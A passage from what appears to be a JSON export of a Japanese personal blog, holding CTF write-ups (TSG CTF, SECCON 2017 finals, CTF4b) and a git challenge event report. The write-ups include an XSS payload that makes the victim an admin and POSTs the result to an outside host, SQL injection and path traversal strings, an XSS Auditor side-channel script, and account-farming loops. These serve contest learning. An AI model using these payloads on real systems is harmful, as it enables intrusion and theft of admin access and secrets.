10_000_000_000\n\n    json({flag: IO.binread('data/flag.txt')})\n  end\n```\n\n怪しいのは送金コードで、こういう形。\n\n```ruby\n  post '/api/transfer' do\n    return err(401, 'login first') unless src = session[:user]\n\n    return err(400, 'bad request') unless dst = params[:target] and String === dst and dst != src\n    return err(400, 'bad request') unless amount = params[:amount] and String === amount\n    return err(400, 'bad request') unless amount = amount.to_i and amount > 0\n\n    sleep 1\n\n    hashed_src = STRETCH.times.inject(src){|s| Digest::SHA1.hexdigest(s)}\n    hashed_dst = STRETCH.times.inject(dst){|s| Digest::SHA1.hexdigest(s)}\n\n    res = DB.query 'SELECT balance FROM account WHERE user = ?', hashed_src\n    row = res.next\n    balance_src = row && row[0]\n    res.close\n    return err(422, 'no enough coins') unless balance_src >= amount\n\n    res = DB.query 'SELECT balance FROM account WHERE user = ?', hashed_dst\n    row = res.next\n    balance_dst = row && row[0]\n    res.close\n    return err(422, 'no such user') unless balance_dst\n\n    balance_src -= amount\n    balance_dst += amount\n\n    DB.execute 'UPDATE account SET balance = ?  WHERE user = ?', balance_src, hashed_src\n    DB.execute 'UPDATE account SET balance = ?  WHERE user = ?', balance_dst, hashed_dst\n\n    json({amount: amount, balance: balance_src})\n  end\n```\n\nぱっと見たところ、トランザクションを考慮していないので、高頻度でリクエストを飛ばせばRace Conditionで二重送金ができそうだったんですが、軽く試したところ、タイミングがシビアでほとんどうまくいかなかったので、この方針は諦めました。\n\nところで、このコードをもう少しよく見ると、宛先と送金元が同一のユーザであったとき、コインが増殖することは明らかです。\nもちろん、自分自身への送金はエラーになる実装となっているんですが、残高の照会をユーザ名をハッシュした値で行っているのに対して、ユーザの同一性判定は元の文字列で行っています。\nつまりは、別の文字列であって、SHA1ハッシュの結果が同一になる文字列の組がもし存在すれば、無限にコインを増やすことができそうです。\n\nSHA1の衝突といえば……[SHAttered](https://shattered.io/)ですよね。\n詳しい理屈はググってもらうとして、これを用いれば、先に述べた要件を満たすような文字列（というかバイト列）の組が用意できます。\n\nJSONとしてnon-printableな文字を送る際に破壊されないように注意しつつ、以下のようにして用意しました。\n\n```php\n<?php\n\t$s1 = file_get_contents(\"shattered-1.pdf\");\n\t$s2 = file_get_contents(\"shattered-2.pdf\");\n\n\t$t1 = substr($s1, 0, 320) . \"narusejun\";\n\t$t2 = substr($s2, 0, 320) . \"narusejun\";\n\n\techo(sha1($t1) . PHP_EOL);\n\techo(sha1($t2) . PHP_EOL);\n\n\tfunction toStr($c) {\n\t\t$i = ord($c);\n\t\tif ($c == '\"') {\n\t\t\treturn '\\\\\"';\n\t\t}\n\t\tif ($c == '%') {\n\t\t\treturn '%%';\n\t\t}\n\t\tif ($i < 0x20) {\n\t\t\treturn sprintf(\"\\\\u%04x\", $i);\n\t\t}\n\t\tif ($i < 0x7F) {\n\t\t\treturn $c;\n\t\t}\n\t\treturn sprintf(\"\\\\x%02x\", ord($c));\n\t}\n\t$u1 = implode(array_map(toStr, str_split($t1)));\n\t$u2 = implode(array_map(toStr, str_split($t2)));\n\n\techo($u1 . PHP_EOL);\n\techo($u2 . PHP_EOL);\n?>\n```\n\nこの文字列のどちらかを使って登録した上で、もう一方の文字列を宛先として指定して送金すると、コインが増殖します。\ncurlを使うと容易です。\n\n# RECON (500pts)\n\nWeb問です。PHPで実装された、プロフィールを登録できるサービスです。\n秘密の質問として20種類のフルーツが好きか否かを選択できるようになっていて、どうやらadminの好きなフルーツをRECONすれば良いみたいです。\n\nソースコードを見ると、自身のプロフィールを確認するページで露骨にCSPが弱められていて、怪しさがあります。\n\n```php\n$response->withHeader(\"Content-Security-Policy\", \"script-src-elem 'self'; script-src-attr 'unsafe-inline'; style-src 'self'\")\n```\n\nこの要素は新しい機能なので、`script-src-elem`と`script-src-attr`が効いていなくて、実質XSSし放題になっているようでした。\nしかしながら、このページはログインしたユーザ自身のプロフィールを表示するものですので、狙った相手にコードを実行させるのは厳しそうな雰囲気があります。\n\nところで、そもそも何故`script-src-attr`などという特殊な(?)制限が付されているのでしょうか？\nこの答えは、このページのソースを注意深く見るとすぐに気が付きました。\n\n```html\n🍇 <input type=\"checkbox\" id=\"grapes\" onchange=\"grapes.checked=false;\" >\n🍈 <input type=\"checkbox\" id=\"melon\" onchange=\"melon.checked=false;\" >\n🍉 <input type=\"checkbox\" id=\"watermelon\" onchange=\"watermelon.checked=false;\" >\n🍊 <input type=\"checkbox\" id=\"tangerine\" onchange=\"tangerine.checked=false;\" >\n🍋 <input type=\"checkbox\" id=\"lemon\" onchange=\"lemon.checked=false;\" >\n🍌 <input type=\"checkbox\" id=\"banana\" onchange=\"banana.checked=false;\" >\n🍍 <input type=\"checkbox\" id=\"pineapple\" onchange=\"pineapple.checked=false;\" >\n🍐 <input type=\"checkbox\" id=\"pear\" onchange=\"pear.checked=false;\" >\n🍑 <input type=\"checkbox\" id=\"peach\" onchange=\"peach.checked=false;\" >\n🍒 <input type=\"checkbox\" id=\"cherries\" onchange=\"cherries.checked=false;\" >\n🍓 <input type=\"checkbox\" id=\"strawberry\" onchange=\"strawberry.checked=false;\" >\n🍅 <input type=\"checkbox\" id=\"tomato\" onchange=\"tomato.checked=false;\" >\n🥥 <input type=\"checkbox\" id=\"coconut\" onchange=\"coconut.checked=false;\" >\n🥭 <input type=\"checkbox\" id=\"mango\" onchange=\"mango.checked=false;\" >\n🥑 <input type=\"checkbox\" id=\"avocado\" onchange=\"avocado.checked=false;\" >\n🍆 <input type=\"checkbox\" id=\"aubergine\" onchange=\"aubergine.checked=false;\" >\n🥔 <input type=\"checkbox\" id=\"potato\" onchange=\"potato.checked=false;\" >\n🥕 <input type=\"checkbox\" id=\"carrot\" onchange=\"carrot.checked=false;\" >\n🥦 <input type=\"checkbox\" id=\"broccoli\" onchange=\"broccoli.checked=false;\" >\n🍄 <input type=\"checkbox\" id=\"mushroom\" onchange=\"mushroom.checked=false;\" >\n```\n\n秘密の質問がプロフィールページに表示されているんですが、この変更を禁止する目的でJavaScriptが用いられているのでした！\nこのコードのみ実行できるようにする目的で、部分的なunsafe-inlineが許容されていたようです。\n\nもし、この小さなJavaScriptコードを盗むことができれば、adminの好きなフルーツを知ることできそうです。\nこのページでは、`X-XSS-Protection: 1; mode=block`というヘッダが送信されていて、XSS Auditorがブロックモードで動作することが期待されていて、adminのブラウザもこれに従っているでしょう。\nこういう場合に、XSS Auditorの誤検出を利用して、ページ内のスクリプトを盗む手法が存在します。\n\n[ブラウザのXSSフィルタを利用した情報窃取攻撃 | MBSD Blog](https://www.mbsd.jp/blog/20160407_2.html)\n\nこれを利用できそうです。（できました。）\n以下のような2つのIFRAMEを表示させれば、どちらか一方をXSS Auditorがブロックするはずです。\n\n```html\n<iframe src='http://34.97.74.235:10033/profile?onchange=\"melon.checked=true;\"'></iframe>\n<iframe src='http://34.97.74.235:10033/profile?onchange=\"melon.checked=false;\"'></iframe>\n```\n\nこの性質を利用し、攻撃者のページで2つのIFRAMEを開かせて、どちらがブロックされたかを判別すれば良いですね。\nIFRAME要素の`contentWindow.length`を見ると、XSS Auditorが作動したか否かを簡単に判別できるようでしたが、手元で試したときに何故かうまくいかなかったので（これは勘違いだったかもしれませんが）、`onload`が発火するまでの時間を計測するちょっと面倒な方法で判別しています。\nXSS Auditorが作動すると、関連リソースの読み込みが走らないので、`onload`が早く呼ばれるはずです。\n\n以下のように実装し、IFRAMEをプロフィールに埋め込んで、adminにアクセスさせました。\nJavaScriptの記法モダンだったりレガシーだったりしていて、気持ち悪いんですが、終了ギリギリで解いていたためいろいろ焦っていて、見当違いの試行錯誤をしていた名残です。\n\n```php\n<?php\n\tif(array_key_exists(\"save\", $_GET)){\n\t\tfile_put_contents(\"save.txt\", $_GET[\"save\"] . PHP_EOL, FILE_APPEND | LOCK_EX);\n\t\techo(\"OK!\");\n\t}else{\n?>\n<html>\n<body>\n<script>\n\nfunction test(key, val){\n\treturn new Promise(function(resolve){\n\t\tconst iframe = document.createElement(\"iframe\");\n\t\tiframe.onload = function(){\n\t\t\tiframe.remove();\n\t\t\tresolve([key, val, new Date().getTime() - time]);\n\t\t};\n\t\tiframe.src = `http://34.97.74.235:10033/profile?onchange=\"${key}.checked=${val};\"`;\n\t\tconst time = new Date().getTime();\n\t\tdocument.body.appendChild(iframe);\n\t});\n}\n\n(async () => {\n\tconst results = [];\n\tfor(let i = 0; i < 1; i++){\n\t\tresults.push([\n\t\t\tawait test(\"mushroom\", true),\n\t\t\tawait test(\"mushroom\", false),\n\t\t]);\n\t}\n\tlocation.href = \"?save=\" + results;\n})();\n</script>\n</body>\n</html>\n<?php\n\t}\n?>\n```\n\nこれを用いて、フルーツ1種類ごとに計測した結果が以下のとおりです。\nCaptchaを連打する必要があって、激ツラかったです。チームメイトにひたすらCaptchaしてもらいました。（もっと頭の良い実装をすればよかった気もしますが。）\n\n| フルーツ | trueのonload(ms)| falseのonload(ms) | 判定結果 |\n| --- | --- | --- | --- |\n| grapes | 84 | 334 | TRUE |\n| melon | 347 | 65 | FALSE |\n| watermelon | 245 | 47 | FALSE |\n| tangerine | 78 | 394 | TRUE |\n| lemon | 83 | 418 | TRUE |\n| banana | 73 | 255 | TRUE |\n| pineapple | 79 | 452 | TRUE |\n| pear | 252 | 48 | FALSE |\n| peach | 74 | 281 | TRUE |\n| cherries | 76 | 336 | TRUE |\n| strawberry | 79 | 318 | TRUE |\n| tomato | 77 | 353 | TRUE |\n| coconut | 77 | 333 | TRUE |\n| mango | 92 | 404 | TRUE |\n| avocado | 254 | 47 | FALSE |\n| aubergine | 85 | 333 | TRUE |\n| potato | 249 | 46 | FALSE |\n| carrot | 72 | 321 | TRUE |\n| broccoli | 428 | 40 | FALSE |\n| mushroom | 87 | 388 | TRUE |\n\nあとは、この結果を用いてadminのrecoveryメッセージ（FLAG）を表示させることができました。\n\n# 総括\n\nWeb問しか触っていないので他のジャンルはわかりかねますが、良い問題でした。\n\n- 誘導が適切で、guessが最小限で済んだ\n- 扱っているテーマも面白いものだった\n\nおわりです。\nなんか💰を貰えるらしいので、焼肉にでも行きたいです🐦\n\nhttps://twitter.com/tsgctf/status/1124933926202560512\n","title":"TSG CTF write-up (Web)","image":null,"tags":["CTF","参加記"],"date":"2019-05-05T00:00:00.000Z","updated":"2021-01-07T13:52:12.000Z"},{"type":"external","url":"https://trap.jp/post/306/","publisher":"東京工業大学デジタル創作同好会traP","title":"ICTトラブルシューティングコンテスト #ICTSC9 に参加した話","tags":["traP","ICTSC","インフラ","参加記"],"date":"2018-04-01T00:00:00.000Z"},{"type":"article","slug":"22","body":"**NaruseJun**というチームでSECCON決勝に出ました。\n\n# 決勝\n\nボクは予選に出られなかったんですが、枠を譲っていただいて憧れのSECCON決勝に出ることができました！\n\nhttps://twitter.com/_n_ari/status/964678908242157569\n\n# 結果\n\n競技開始後すぐAttackPointを稼ぎ、しばらくは首位を独走していましたがその後停滞。\n午後にDefencePointでジリジリを順位を上げ首位に返り咲いたものの、終了間際で追い抜かれ**2位(準優勝)**で終了しました。\n**文部科学大臣賞 個人賞**も頂きました。\n\nhttps://twitter.com/yamaha_sn/status/964784430572232705\n\nhttps://twitter.com/yamaha_sn/status/964787478178615302\n\nhttps://twitter.com/sekai67/status/964792274025529345\n\n# Writeup\n\n## 府中\n\nWeb問？\nElectronで書かれた音楽系SNSで、曲をアップロードできたりするようです。\n\n### Attack\n\nアップロードする際のファイル名もDBに記録しているようで、ここにSQLインジェクション脆弱性があります。\n\n```sql\n', 0, (SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES LIMIT 0, 1)) -- .wav\n```\n\nのようなファイルを投げると、MariaDBが型エラーを吐き、そのエラーメッセージで内容がわかります。\n\nいろいろ見ていたんですが、特に怪しいテーブルも存在せず、さらにDBにアクセスしているユーザが`file`テーブル以外へのアクセス権を持っていないように見えました。\n（挑戦していたのが終了間近で焦っていたので、違ったかもしれない……）\n\nで、結局ここから先がわかりませんでした……\nここからuserテーブルのis_adminフラグを立てるとか、adminのパスワードを抜くとかでしょうか？\nわかりません。\n\n### Defence\n\n再生数ランキング上位の曲名にディフェンスキーワードを入れられると、DefencePointがもらえます。\n\n1アカウント辺り、1再生しかカウントされないので、ランキングを上げるにはアカウントを量産することが必要です。\n適当にPOSTを投げるとアカウントが作れるので、さほど難しくないです。\n\n再生数のカウントは、ストリーミングサーバから実際に曲ファイルを取得した際に行われていて、\nストリーミングサーバへのリクエストはTCP上の独自プロトコル？っぽいもので通信しています。\nアプリが実際に使っているソースコードは、Electronパッケージから簡単に抜けるので、これを使うと簡単。\n\n#### 再生数を増やすNode.js向けスクリプト\n\n```js\nvar PromiseSocket = require('promise-socket');\n\nasync function getWAV(streaming_host, streaming_port, song, api_key) {\n    return new Promise(async (resolve, reject) => {\n        const socket = new PromiseSocket();\n        await socket.connect({\n            host: streaming_host,\n            port: streaming_port\n        });\n        for(let i = 0; i < 100; i++){\n            // '\\x80': select song\n            await socket.write(\"\\x80\");\n            await socket.write(song['unique_id']);\n            await socket.write(api_key);\n            // '\\x82': get WAV File Headers\n            await socket.write(\"\\x82\");\n            await socket.write(\"\\x84\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x7f\");\n            await socket.write(\"\\x81\");\n        }\n        // '\\x90': close connection\n        await socket.write(\"\\x90\");\n        // let result = (await socket.readAll());\n        let result = (await socket.end());\n        resolve(result);\n    });\n}\n\n\n(async _ => {\n    console.log(await getWAV(\"fuchu.koth.seccon\", 8000, {unique_id: process.argv[2]}, process.argv[3]));\n})();\n```\n\n#### アカウントを量産して再生数を稼ぐスクリプト\n\n```sh\nexport FLAG=\"176872aa9e14b27d972e2c56b1ec16db\"\nexport USERID=\"2099\"\nexport APIKEY=\"8be67707f019fe37fb4cf74e096b815ebcebfc7fc10790d19e8d71eb32482d49\"\nexport RESP=$(curl -X POST http://fuchu.koth.seccon/files -H \"X-FUCHU-KEY: $APIKEY\" -F \"file=@./po.wav;type=audio/wav\")\nexport UNIQID=$(echo $RESP | sed -E 's/[^:]+:\"([^,]+)\".+/\\1/')\nexport PAYLOAD=$(printf '{\"name\":\"%s\",\"unique_id\":\"%s\",\"artist\":%s,\"description\":\"hello\"}' $FLAG $UNIQID $USERID)\ncurl -X POST http://fuchu.koth.seccon/songs -H \"X-FUCHU-KEY: $APIKEY\" -H \"Content-Type: application/json\" --data \"$PAYLOAD\"\n\nwhile true\ndo\n\texport USER=$(head /dev/urandom | md5)\n\texport PAYLOAD=$(printf '{\"username\":\"%s\",\"password\":\"Hello I Am NaruseJun\",\"email\":\"%s@seccon.jp\",\"sex\":\"0\",\"birthday\":\"2018-02-15\",\"free_text\":\"\"}' $USER $USER)\n\tcurl -X POST http://fuchu.koth.seccon/users -H \"Content-Type: application/json\" --data \"$PAYLOAD\"\n\texport PAYLOAD=$(printf '{\"username\":\"%s\",\"password\":\"Hello I Am NaruseJun\"}' $USER)\n\texport RESP=$(curl -X POST http://fuchu.koth.seccon/auth -H \"Content-Type: application/json\" --data \"$PAYLOAD\")\n\texport APIKEY=$(echo $RESP | sed -E 's/.+\"(.+)\".+/\\1/')\n\tnode increment.js $UNIQID $APIKEY\ndone\n```\n\nこれらを用いると、ディフェンスキーワードをランキングに載せることができるので、\nチームメイトにお願いして書き込み続けてもらいました。\n\n## 船橋\n\n提示された指紋画像と一致するような、別の指紋画像を20個の候補の中から10秒以内に選択するような問題が10題出され、\nそのうちいくつかに正解できればAttackPointが手に入ります。5問以上を解くことができれば、DefencePointも手に入る様子。\n\n教師用データセットも与えられるので、機械学習するのが正攻法？\n他のチームの方に話を聞いたら、そもそも問題として出て来る画像のバリエーションが多くないので、力押しでなんとかなる……らしい。\n\nボクが目視でそれっぽい指紋を選んだら通りました。\n競技開始直後に説いているチームがちらほらいたので、気合で解けそうだなぁという気分がしていました。\n\n## 幕張\n\nスマートロックのアプリ(x86_64 ELF)を解析する問題。解けませんでした。\n\n後から聞いた話だと、MQTTでいろいろしていて、SubscribeするとFLAGが降ってくるとかこないとか？\nなんか外と通信しているんだろうなぁというのは分かったんですが、\nELFが動いて競技ネットワークと通信できるような環境を用意するのが難儀で、後回しにしていました。\n\n\n## 梅田\n\n画像投稿サイト。Web問。\n\n### Defence\n\nまず、ディフェンスキーワードは最もFav数の多いベージのコメント欄なので、\nもっともFav数の多いページにキーワードを書き込み続けるだけでした。\n\nどのページが最もFav数が多いかを追いかけるのが面倒そうだなぁと感じていたんですが、\nそもそもFav数を増やして対象ページをコロコロ変えるような戦略を取るチームがいなかったようで、\nそれほど頻繁には変わっていませんでした。\n登録時にしばしば429エラーが出ていたので、アカウント量産するのが難しかったのかな？\n\n```sh\nwhile true\ndo\n\texport CONTENT=44b106151c01d64e0c479eb43ef12a48\n\tcurl http://umeda.koth.seccon/photos/1 -H \"Cookie: PHPSESSID=5d7ef56d0cab6e12ec27e431c004e569\" > cache\n\texport NAME=$(cat cache | sed -E 's/.+\"csrf_name\" value=\"([^\"]+)\".+/\\1/')\n\texport VALUE=$(cat cache | sed -E 's/.+\"csrf_value\" value=\"([^\"]+)\".+/\\1/')\n\tcurl http://umeda.koth.seccon/photos/1/comment -X POST -H \"Cookie: PHPSESSID=5d7ef56d0cab6e12ec27e431c004e569\" -d csrf_name=$NAME -d csrf_value=$VALUE -d content=$CONTENT\ndone\n```\n\n### Attack\n\n1つ目のFLAGは、普通に`ID:1`の画像ページに書いてあった。\n\n不適切な画像(?)を管理者に報告するフォームでXSSができるようでした。\nただし、`Content-Security-Policy: script-src 'self'`ヘッダがついているので、\n画像アップロード機能を悪用して、同一オリジンに悪意のあるスクリプトを設置する必要があります。\n\nこんな感じに、`GIF8`がファイル先頭にあれば、画像ファイルかどうかのチェックをすり抜けられます。\n\n```js\nGIF8=8;\n\nfetch(\"/admin/users\", {credentials: 'include'})\n.then(r => r.text())\n.then(r => {\n\tconst [,v] = r.match(/name=\"csrf_value\" value=\"(.+?)\"/);\n\tconst [,n] = r.match(/name=\"csrf_name\" value=\"(.+?)\"/);\n\tconst body = `csrf_value=${v}&csrf_name=${n}&name=azon`;\n\treturn fetch(\"/admin/new-admin\", {\n\t\tbody,\n\t\tmethod: \"POST\",\n\t\theaders: {\n\t\t\t'Content-Type': 'application/x-www-form-urlencoded',\n\t\t},\n\t\tcredentials: 'include',\n\t});\n})\n.then(r => r.text())\n.then(r => fetch(\"http://192.168.14.4:8000/users\", {method: \"POST\", body: r}))\n```\n\n管理者のブラウザで適当に`/admin`ページを漁ると、\nどうやら任意のユーザを管理者に昇格する機能が存在することが分かるので、↑のコードで自分のアカウントを管理者にします。\n管理者でログインすると、2つ目と3つ目のFLAGがCookieに設定されていました。\n\nで、更に管理者ページを探すと`/admin/logs`というアプリのログを確認する機能が存在することがわかります。\nこのページの挙動をよく観察すると、単にログファイルのtailを表示しているだけで、\nさらにそのログファイルを指定するパラメータにパストラバーサル脆弱性があるようでした。\n\n管理者で`/admin/logs?p=/../../../../../../var/www/umeda/src/routes.php`としてソースの末尾を見ると、\n4つ目と5つ目のFLAGは環境変数に書き込まれていることが分かります。\nちなみに、ソースコードの所在は、変なパラメータを投げた時に帰ってくるエラーメッセージを読むとわかります。\n\n環境変数は`/admin/logs?p=/../../../../../../proc/self/environ`で読めます。\n","title":"SECCON2017国内決勝大会に出ました","image":null,"tags":["CTF","SECCON","参加記"],"date":"2018-02-20T00:00:00.000Z","updated":"2021-01-07T13:52:12.000Z"},{"type":"external","url":"https://trap.jp/post/200/","publisher":"東京工業大学デジタル創作同好会traP","title":"VolgaCTF 2017 Quals に出た話【新歓ブログリレー2017 11日目】","tags":["traP","CTF","参加記"],"date":"2017-04-07T00:00:00.000Z"},{"type":"external","url":"https://trap.jp/post/167/","publisher":"東京工業大学デジタル創作同好会traP","title":"サイバーコロッセオ×SECCON 2016に出ました","tags":["traP","CTF","参加記"],"date":"2017-03-07T00:00:00.000Z"},{"type":"article","slug":"15","body":"行きました\n\n株式会社mixiさんがやってる神イベント**第5回git challenge**に行ってきました。\n\n## git challenge\n\ngitで与えられた課題を解決していく競技(?)イベント\n要は与えられたリポジトリを指定された状態に持っていけばよし\n\nmixiさんの説明を見たほうが早い\n\nhttps://github.com/mixi-git-challenge/publications\n\n## 参加\n\n第4回にも応募したんですけど落ちました。\n**ES出してなかったからね。**\n\nちなみに[同じ大学の友人が第4回に行ってる](https://trap.jp/post/100/)よ。\n\nhttps://trap.jp/post/100/\n\n今回は無事(?)通りました。\n同大の人がけっこう応募してたのを見たけど、ことごとく落ちてたのでけっこう人気そう。\n\n![](1.jpg)\n\n## 流れ\n\n午前：簡単なチュートリアル\nお昼：ご飯\n\nhttps://twitter.com/sekai67/status/825296559260643328\n\n午後：競技\n夕方：懇親会\n\n## 競技\n\n2人1組です。\nあらかじめチームが組まれているので安心ですね。\n\nボクのチームメイトは中国からの留学生で、Swiftのプロ👏でした。\nでもgitは1人でしか使ったこと無いのでつらいよ＞＜らしいです。\n\nということで★１をお願いして、ボクは★２↑をやりました。\n途中チームメイトがつらいつらい＞＜してたので教えてあげながら一緒に解いてました。\n\n問題の内容を書くと多分怒られるので、ざっくりと感想を書くと、\n- gitの基礎はわかっていないと死ぬ\n- 発展的な機能を使いこなす系問題が主\n- めっちゃ勉強になる\n- ★5↑は悪ノリ\n- たのしい\n\n★5↑、未だに解かれてないらしいです。\nボクも頑張ったんですが、あと僅かのところでタイムアップ。残念。\n\n## 結果\n\n![](2.jpg)\n\nbravoです。\n\nhttps://twitter.com/N4RU5E/status/825262132514000898\n\n景品です。うれしい。\n\n## 懇親会\n\n🍺とか振る舞われます。\nプレモルはアド\n\nhttps://twitter.com/N4RU5E/status/825287811649507329\n\nなんか[セキュリテイ・キャンプ](/posts/9/)で見た顔ぶれだ……！\nってなりました。\n\nセキュキャン勢はこういうイベントで良く会う。\n何処にでも出没するな……\n\n## おわり\n\nたのしい！ためになる！\n\nmixi「イベントにmixi色がない」\nボク「それな」\n\nmixiさん！！！！\n[Scrap Challenge](https://www.google.co.jp/search?q=mixi+Scrap+Challenge)復活してください！！！！！\n","title":"第5回git challengeに行った","image":null,"tags":["git","git challenge","mixi","参加記"],"date":"2017-01-28T00:00:00.000Z","updated":"2021-01-07T13:52:12.000Z"},{"type":"article","slug":"13","body":"行きました\n\n東京から参りました成瀬順と申します。\n\nCTF4b東京は大人気だったらしく行けなかったので、金沢へ参加しました。\n\n# Web\n\n- ChromeのDevToolsの使い方\n- ディレクトリトラバーサル\n- SQLインジェクション\n- XSS(の紹介だけ)\n\n演習中心で、実際にやってみよう！って感じなので楽しくて分かりやすかったです。\n\nあとディレクトリトラバーサルとかSQLインジェクションの演習になんか隠しFLAGみたいなものが置いてあって、\n†ビギナー†の人も楽しめそうでした。\n\nSQLiの方の隠しFLAGは見つけられました\n`web4b{can_access_another_table}`\n\n# Forensics\n\n- Forensicsとは\n- ネットワークについて\n- ツールの使い方\n  - Wireshark\n  - binwalk\n  - exiftool\n  - The Sleuth Kit\n\nForensicsは全く知識がなかったので色々勉強になりました。\nWiresharkの便利な機能をたくさん知れたので強くなった気がします💪\n\n# Reversing\n\n- プログラム実行の仕組み\n- x86アセンブリ入門\n\nちょうど大学でx86を勉強したところだったので、なんとかついていけました。\n**上達のコツ**はたくさん読むことだそうです（がんばります＞＜）\n\n# CTF\n\n講義で学んだことを活かしてみよう！というやつです。\n\nがんばって全部解きました！\n\n![](1.png)\n\nhttps://twitter.com/ctf4b/status/802446106776850432\n\nFLAGためて10分前にまとめて出してみました。\nいわゆるサブマリン戦法です。（一度やってみたかったんです＞＜）\n\n以下Writeup\n\n\n## Warmup (Misc 10)\n\nやるだけ\n\n## てけいさん for ビギナーズ (Misc 200)\n\nめっちゃ簡単な計算問題が100問出されるので全部解いてねって問題でした。\n与えられたURLにアクセスすると計算式が書いてあって、その下にあるフォームに値を入力してSubmitするようになってます。\nたぶんPHPのSESSIONで何問解いたかをカウントしてるので、ここはどうにもできなさそうです。\n\n最初ふつうに100問解こうかなと思ったんだけど間違えたらリセットされるみたいなのでやめました。\n\nJavaScriptを書いて(Web講義で習ったDevToolsを使って)100回走らせました。\n\n```javascript\ndocument.querySelector(\"input[type=text]\").value = eval(document.querySelector(\"div\").textContent);\ndocument.querySelector(\"input[type=submit]\").click();\n```\n\n模範解答はPython(?)でやってたけどスクレイピングして……とかが面倒そうでした。\n\n## CountUp Game (Misc 200)\n\n> 交互にカウントアップしていこう ただし，21を言ってはいけません\n\nコンピュータと交互に1〜3づつ値を増やしていって、21を踏んだら負けるゲームを10連勝してねって問題でした。\nなんか競プロでありそうな問題ですね。\n\nそんなに難しくなくて、自分が必ず後攻なので、自分が必ず4の倍数を踏むようにしていれば勝てます。\nたった10勝でOKなので、手でやりました。\n\n## Fix it (Web 100)\n\n> ページ遷移を行うプログラムを書いたが何かを間違っているらしく正常に動作しないそうだ。何がおかしいのか調べてほしい。\n\n講義でやったやつだ！\n\n送られてくるヘッダをよく見てみると、\n`Locatin: /web100/flag_is_here.php`\nTypoしてます。\n\nということで、このURLにに行くとFlagが落ちてました。\n\n## Login as Admin (Web 200)\n\nこれも講義でやったやつだ！\n\nSQLインジェクションっぽいですね。\nので、\n```\nusername: admin\npassword: ' OR 1 --\n```\nとかしてみたらイケました。\n\n## 1M4G3 V13W3R (Web 200)\n\n画像アップローダです。\nアップされた画像を開いてみると、URLが`/web200-2/view.php?file=f5b5a9b812d45f55.jpg`とかで、怪しい。\n\n講義でやったディレクトリトラバーサルかな！？\n\nじゃあ`/web200-2/view.php?file=../index.php`とかすると、\nPHPコメントでFlagが書いてありました。\n\n## Login Lv2 (Web 300)\n\nまたログインフォームです。\n普通にSQLインジェクションを試行するんですが、どうも上手く行かないようです。\n（でもエラーにはなります。うーん？）\n\n適当にログインを試行していると、「ユーザー名かパスワードが間違っています。」と怒られるんですけど、\nこのときのURLが`/web300/index.php?error=invalid_user.txt`とかなってて、アレかなってなりました。\n\nということで、POSTリクエストの宛先である`/web300/index.php?error=login.php`を見てみると、\n```php\n$sql = \"SELECT username, password FROM users WHERE username = ('{$username}') AND password = ('{$password}');\";\n```\n\nカッコで囲んでいたんですね！\nじゃあこうすれば……\n```\nusername: admin\npassword: ') OR 1 --\n```\nイケました。\n\n## FileSystem (Forensics 100)\n\n謎のファイルが渡されます。\n（なんのファイルかは問題名から察せそうですけど、）とりあえず講義で学んだように、どんなファイルであるかを調べてみます。\n\n```sh\n# file for100\nfor100: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID \"mkfs.fat\", sectors/cluster 4, root entries 512, sectors 8192 (volumes <=32 MB) , Media descriptor 0xf8, sectors/FAT 6, sectors/track 32, heads 64, serial number 0x742adb6b, unlabeled, FAT (12 bit)\n```\n\nFATですね。\nではでは、講義で習ったThe Sleuth Kitを使ってみます。\n\n```sh\n# fls for100\nr/r 4:   flag.txt\nr/r * 6: .flag.txt.swp\nv/v 130867: $MBR\nv/v 130868: $FAT1\nv/v 130869: $FAT2\nd/d 130870: $OrphanFiles\n```\n\nありますね！\n\n```sh\n# icat for100 4\nctf4b{\n```\n\n消えてる……\n\nここで削除済みの`.flag.txt.swp`に注目します。\nこのファイルはvimが編集履歴を保持しておくファイルで、通常はファイルが保存されたらこのswpは削除されます。\n\nでもこのイメージにはバッチリ(削除済みファイルとして)残ってるので、\n\n```sh\n# icat for100 6\nU3210#\"! Utpad????ctf4b{ff97e486da08bfec774688ca3ef6ac42}\n```\n\n### ラクをする\n\n問題名から察するに、講義で紹介したThe Sleuth Kitを使ってなんかしてね！って問題なんだろうなって思ったんですけど、\nstringsでゴリ押してしまいました＞＜\n\n```sh\nstrings for100 | grep ctf4b{\n```\n\n## みてみよう (Forensics 200)\n\npcapファイルが渡されます。\n\nそんなにリクエスト数が多くなくて、PNGをダウンロードしてるHTTP通信が１つだけです。\n授業で習ったように、ファイル＞オブジェクトをエクスポートでこのPNGをファイルを取り出してみます。\n\nそうするとただの真っ白な画像ファイルでした。（困った……）\nここで、講義で習ったbinwalkを使ってみます。\n\n```sh\n# binwalk flag.png\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n0             0x0             PNG image, 320 x 240, 8-bit/color RGB, non-interlaced\n41            0x29            Zlib compressed data, best compression\n744           0x2E8           Unix path: /www.w3.org/1999/02/22-rdf-syntax-ns#'>\n```\n\nなんかRDFのデータがくっついてますね。\nじゃあ、講義で習ったexiftoolを使ってみます。\n\n```sh\n# exiftool flag.png\nExifTool Version Number         : 10.20\nFile Name                       : flag.png\nDirectory                       : ..\nFile Size                       : 1010 bytes\nFile Modification Date/Time     : 2016:11:27 03:02:03+00:00\nFile Access Date/Time           : 2016:11:27 03:06:03+00:00\nFile Inode Change Date/Time     : 2016:11:27 03:02:33+00:00\nFile Permissions                : rwxrwx---\nFile Type                       : PNG\nFile Type Extension             : png\nMIME Type                       : image/png\nImage Width                     : 320\nImage Height                    : 240\nBit Depth                       : 8\nColor Type                      : RGB\nCompression                     : Deflate/Inflate\nFilter                          : Adaptive\nInterlace                       : Noninterlaced\nXMP Toolkit                     : Image::ExifTool 9.74\nKeywords                        : ctf4b{f970e2767d0cfe75876ea857f92e319b}\nImage Size                      : 320x240\nMegapixels                      : 0.077\n```\n\n見えました！\n\n### ラクをする\n\nたぶん講義で紹介したWiresharkを使ってFlag探してね！って問題なんだろうなって思ったんですけど、\nstringsでゴリ押してしまいました＞＜\n\n```sh\nstrings for200 | grep ctf4b{\n```\n\n## ICMP？ (Forensics 200)\n\npcapファイルが渡されます。\n\nWiresharkで普通に開くと、pingのrequestとreplyだけが記録されています。\n眺めていると、1つだけサイズが大きい通信があります。（統計＞パケット長を見ても良かったかも。）\n\nで、このパケットを見ると、pingのDataに何故かHTTPレスポンスがのっています。\n\n```\nY'VERM]@@ {T 